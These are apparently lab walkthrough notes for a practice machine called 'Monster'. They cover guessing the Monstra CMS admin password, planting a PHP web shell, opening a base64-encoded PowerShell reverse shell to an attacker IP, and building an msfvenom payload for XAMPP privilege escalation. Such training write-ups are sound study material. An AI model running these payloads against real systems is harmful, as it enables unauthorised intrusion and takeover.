#box

*Created: 2/8/2026*

### Step 1

**Tags:** #Weak-Credentials #Credential-Guessing

**Command:**
```bash
# Authenticate with admin:wazowski
```

*Port: 80*

> 
> Monster hosts a website on port 80. A quick enumeration shows us a `/blog` endpoint leading us onto a `/blog/admin` panel hosted by Monstra CMS 3.0.4. This CMS has plenty of vulnerability, however, looking at the `/users` endpoint we  fundamentally discover 2 users: admin, mike. The admin panel has a ban system, however after a few tries we manage to enter with `admin:wazowski` (`wazowski` being the surname of Mike from Monsters & Co., the name is shown in clear sight also in the users endpoint.

---

### Step 2

**Tags:** #Web-Shell

**Command:**
```php
<pre>
   <?=`$_GET[cmd]`?>
</pre>
```

*Port: 80*

> 
> Once authenticated, we head Extends -> Themes and proceed to add a webshell inside the `index` theme, surrounded by `<pre></pre>` tags

---

### Step 3

**Tags:** #Reverse-Shell

**Command:**
```bash
curl 'http://monster.pg/blog/?cmd=powershell%20-c%20"powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA5ACIALAAzADMAOAA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
```

*Port: 80*

> 
> Once had the webshell, we proceed to gain a reverse shell. To do so, after a few tries we discover we can manage to get a reverse shell on port 3389 with Powershell #3 Base64. Since it's really unstable we need to reload the machine if we get disconnected.

---

### Step 4

**Tags:** #msfvenom #Reverse-Shell #Service-Binary-Hijacking #xampp

**Command:**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.229 LPORT=3389 -f exe -o msf.exe
```

*💎 GEM*

> 
> To gain privilege escalation it's necessary to look as always at what's in clear sight. in C:\ we can only find xampp. We discover through the README that this is xampp version 7.3.10. We discover that this version is vulnerable to [CVE-2020-11107](https://www.exploit-db.com/exploits/50337). Basically we'll have to craft a malicious payload and at a given point the administrator will execute the command that will give us a shell.

---

